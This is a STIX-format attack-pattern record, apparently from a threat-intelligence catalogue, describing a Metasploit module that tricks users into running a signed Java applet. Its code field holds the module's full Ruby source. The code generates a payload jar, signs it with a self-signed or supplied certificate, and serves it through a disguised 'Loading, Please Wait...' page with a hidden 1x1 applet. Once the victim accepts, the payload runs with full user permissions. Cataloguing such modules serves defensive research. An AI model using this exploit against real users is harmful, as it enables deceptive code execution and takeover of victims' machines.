{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6c172a00-c579-4051-988c-0c1d14609c01",
    "created": "2024-08-14T17:05:53.837059Z",
    "modified": "2024-08-14T17:05:53.837063Z",
    "name": "Java Signed Applet Social Engineering Code Execution",
    "description": " This exploit dynamically creates a .jar file via the Msf::Exploit::Java mixin, then signs the it.  The resulting signed applet is presented to the victim via a web page with an applet tag.  The victim's JVM will pop a dialog asking if they trust the signed applet.  On older versions the dialog will display the value of CERTCN in the \"Publisher\" line.  Newer JVMs display \"UNKNOWN\" when the signature is not trusted (i.e., it's not signed by a trusted CA).  The SigningCert option allows you to provide a trusted code signing cert, the values in which will override CERTCN. If SigningCert is not given, a randomly generated self-signed cert will be used.  Either way, once the user clicks \"run\", the applet executes with full user permissions.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/java_signed_applet.rb",
            "external_id": "java_signed_applet.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-valsmith-metaphish.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize( info = {} )\n    super( update_info( info,\n      'Name'          => 'Java Signed Applet Social Engineering Code Execution',\n      'Description'   => %q{\n          This exploit dynamically creates a .jar file via the\n        Msf::Exploit::Java mixin, then signs the it.  The resulting\n        signed applet is presented to the victim via a web page with\n        an applet tag.  The victim's JVM will pop a dialog asking if\n        they trust the signed applet.\n\n        On older versions the dialog will display the value of CERTCN\n        in the \"Publisher\" line.  Newer JVMs display \"UNKNOWN\" when the\n        signature is not trusted (i.e., it's not signed by a trusted\n        CA).  The SigningCert option allows you to provide a trusted\n        code signing cert, the values in which will override CERTCN.\n        If SigningCert is not given, a randomly generated self-signed\n        cert will be used.\n\n        Either way, once the user clicks \"run\", the applet executes\n        with full user permissions.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        => [ 'natron' ],\n      'References'    =>\n        [\n          [ 'URL', 'http://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-valsmith-metaphish.pdf' ]\n        ],\n      'Platform'      => %w{ java linux osx solaris win },\n      'Payload'       => { 'BadChars' => '', 'DisableNops' => true },\n      'Targets'       =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Platform' => ['java'],\n              'Arch' => ARCH_JAVA\n            }\n          ],\n          [ 'Windows x86 (Native Payload)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Linux x86 (Native Payload)',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Mac OS X PPC (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_PPC,\n            }\n          ],\n          [ 'Mac OS X x86 (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86,\n            }\n          ]\n        ],\n      'DefaultTarget'  => 1,\n      'DisclosureDate' => '1997-02-19'\n    ))\n\n    register_options( [\n      OptString.new('CERTCN', [ true,\n        \"The CN= value for the certificate. Cannot contain ',' or '/'\",\n        \"SiteLoader\"\n        ]),\n      OptString.new('APPLETNAME', [ true,\n        \"The main applet's class name.\",\n        \"SiteLoader\"\n        ]),\n      OptPath.new('SigningCert', [ false,\n        \"Path to a signing certificate in PEM or PKCS12 (.pfx) format\"\n        ]),\n      OptPath.new('SigningKey', [ false,\n        \"Path to a signing key in PEM format\"\n        ]),\n      OptString.new('SigningKeyPass', [ false,\n        \"Password for signing key (required if SigningCert is a .pfx)\"\n        ]),\n    ])\n  end\n\n\n  def setup\n    load_cert\n    load_applet_class\n    super\n  end\n\n\n  def on_request_uri( cli, request )\n    if not request.uri.match(/\\.jar$/i)\n      if not request.uri.match(/\\/$/)\n        send_redirect( cli, get_resource() + '/', '')\n        return\n      end\n\n      print_status( \"Handling request\" )\n\n      send_response_html( cli, generate_html, { 'Content-Type' => 'text/html' } )\n      return\n    end\n\n    p = regenerate_payload(cli)\n    if not p\n      print_error(\"Failed to generate the payload.\")\n      # Send them a 404 so the browser doesn't hang waiting for data\n      # that will never come.\n      send_not_found(cli)\n      return\n    end\n\n    # If we haven't returned yet, then this is a request for our applet\n    # jar, build one for this victim.\n    jar = p.encoded_jar(:random => true)\n\n    jar.add_file(\"#{datastore[\"APPLETNAME\"]}.class\", @applet_class)\n\n    jar.build_manifest(:main_class => \"metasploit.Payload\", :app_name => \"#{datastore[\"APPLETNAME\"]}\")\n\n    jar.sign(@key, @cert, @ca_certs)\n    #File.open(\"payload.jar\", \"wb\") { |f| f.write(jar.to_s) }\n\n    print_status(\"Sending #{datastore['APPLETNAME']}.jar. Waiting for user to click 'accept'...\")\n    send_response( cli, jar.to_s, { 'Content-Type' => \"application/octet-stream\" } )\n\n    handler( cli )\n\n  end\n\n\n  def load_applet_class\n    data_dir = File.join(Msf::Config.data_directory, \"exploits\", self.shortname)\n    if datastore[\"APPLETNAME\"]\n      unless datastore[\"APPLETNAME\"] =~ /^[a-zA-Z_$]+[a-zA-Z0-9_$]*$/\n        fail_with(Failure::BadConfig, \"APPLETNAME must conform to rules of Java identifiers (alphanum, _ and $, must not start with a number)\")\n      end\n      siteloader = File.open(File.join(data_dir, \"SiteLoader.class\"), \"rb\") {|fd| fd.read(fd.stat.size) }\n      # Java strings are prefixed with a 2-byte, big endian length\n      find_me = [\"SiteLoader\".length].pack(\"n\") + \"SiteLoader\"\n      idx = siteloader.index(find_me)\n      len = [datastore[\"APPLETNAME\"].length].pack(\"n\")\n      # Now replace it with the new class name\n      siteloader[idx, \"SiteLoader\".length+2] = len + datastore[\"APPLETNAME\"]\n    else\n      # Don't need to replace anything, just read it in\n      siteloader = File.open(File.join(data_dir, \"SiteLoader.class\"), \"rb\") {|fd| fd.read(fd.stat.size) }\n    end\n    @applet_class = siteloader\n  end\n\n\n  def load_cert\n    if datastore[\"SigningCert\"]\n      cert_str = File.open(datastore[\"SigningCert\"], \"rb\") {|fd| fd.read(fd.stat.size) }\n      begin\n        pfx = OpenSSL::PKCS12.new(cert_str, datastore[\"SigningKeyPass\"])\n        @cert = pfx.certificate\n        @key  = pfx.key\n        @ca_certs = pfx.ca_certs\n\n      rescue OpenSSL::PKCS12::PKCS12Error\n        # it wasn't pkcs12, try it as concatenated PEMs\n        certs = cert_str.scan(/-+BEGIN CERTIFICATE.*?END CERTIFICATE-+/m)\n        @cert = OpenSSL::X509::Certificate.new(certs.shift)\n        @ca_certs = nil\n        while certs.length > 0\n          @ca_certs ||= []\n          @ca_certs << OpenSSL::X509::Certificate.new(certs.shift)\n        end\n\n        if datastore[\"SigningKey\"] and File.file?(datastore[\"SigningKey\"])\n          key_str = File.open(datastore[\"SigningKey\"], \"rb\") {|fd| fd.read(fd.stat.size) }\n        else\n          key_str = cert_str\n        end\n\n        # First try it as RSA and fallback to DSA if that doesn't work\n        begin\n          @key = OpenSSL::PKey::RSA.new(cert_str, datastore[\"SigningKeyPass\"])\n        rescue OpenSSL::PKey::RSAError => e\n          @key = OpenSSL::PKey::DSA.new(cert_str, datastore[\"SigningKeyPass\"])\n        end\n      end\n    else\n      # Name.parse uses a simple regex that isn't smart enough to allow\n      # slashes or commas in values, just remove them.\n      certcn = datastore[\"CERTCN\"].gsub(%r|[/,]|, \"\")\n      x509_name = OpenSSL::X509::Name.parse(\n        \"C=Unknown/ST=Unknown/L=Unknown/O=Unknown/OU=Unknown/CN=#{certcn}\"\n        )\n\n      @key  = OpenSSL::PKey::DSA.new(1024)\n      @cert = OpenSSL::X509::Certificate.new\n      @cert.version = 2\n      @cert.serial = 1\n      @cert.subject = x509_name\n      @cert.issuer = x509_name\n      @cert.public_key = @key.public_key\n      @cert.not_before = Time.now\n      # FIXME: this will break in the year 2037 on 32-bit systems\n      @cert.not_after = @cert.not_before + 3600 * 24 * 365 # 1 year\n    end\n  end\n\n\n  def generate_html\n    html  = %Q|<html><head><title>Loading, Please Wait...</title></head>\\n|\n    html << %Q|<body><center><p>Loading, Please Wait...</p></center>\\n|\n    html << %Q|<applet archive=\"#{get_resource.sub(%r|/$|, '')}/#{datastore[\"APPLETNAME\"]}.jar\"\\n|\n    vprint_line(html)\n    if @use_static\n      html << %Q|  code=\"SiteLoader\" width=\"1\" height=\"1\">\\n|\n    else\n      html << %Q|  code=\"#{datastore[\"APPLETNAME\"]}\" width=\"1\" height=\"1\">\\n|\n    end\n    html << %Q|</applet>\\n</body></html>|\n    return html\n  end\n\n\n  # Currently unused until we ship a java compiler of some sort\n  def applet_code\n    applet = <<-EOS\nimport java.applet.*;\nimport metasploit.*;\n\npublic class #{datastore[\"APPLETNAME\"]} extends Applet {\n  public void init() {\n    try {\n      Payload.main(null);\n    } catch (Exception ex) {\n      //ex.printStackTrace();\n    }\n  }\n}\nEOS\n  end\nend\n\n=begin\n\nThe following stores a bunch of intermediate files on the path to creating the signature.  The\nImportKey class used for testing was obtained from:\nhttp://www.agentbob.info/agentbob/79-AB.html\n\n  system(\"rm -rf signed_jar/*\")\n  File.open(\"signed_jar/cert.pem\", \"wb\")     { |f| f.write(@cert.to_s + @key.to_s) }\n  File.open(\"signed_jar/key.pem\",  \"wb\")     { |f| f.write(@key.to_s  + @key.public_key.to_s) }\n  File.open(\"signed_jar/unsigned.jar\", \"wb\") { |f| f.write jar.to_s }\n\n  File.open(\"signed_jar/jarsigner-signed.jar\", \"wb\") { |f| f.write jar.to_s }\n  system(\"openssl x509 -in signed_jar/cert.pem -inform PEM -out signed_jar/cert.der -outform DER\")\n  system(\"openssl pkcs8 -topk8 -nocrypt -in signed_jar/key.pem -inform PEM -out signed_jar/key.der -outform DER\")\n  system(\"java -cp . ImportKey signed_jar/key.der signed_jar/cert.der\")\n  system(\"mv ~/keystore.ImportKey ~/.keystore\")\n  system(\"jarsigner -storepass importkey signed_jar/jarsigner-signed.jar importkey\")\n\n  jar.sign(@key, @cert)\n  File.open(\"signed_jar/signed.jar\", \"wb\")   { |f| f.write jar.to_s }\n\n=end\n",
    "x_mitre_disclosure_date": "1997-02-19",
    "x_mitre_platforms": [
        "osx'"
    ]
}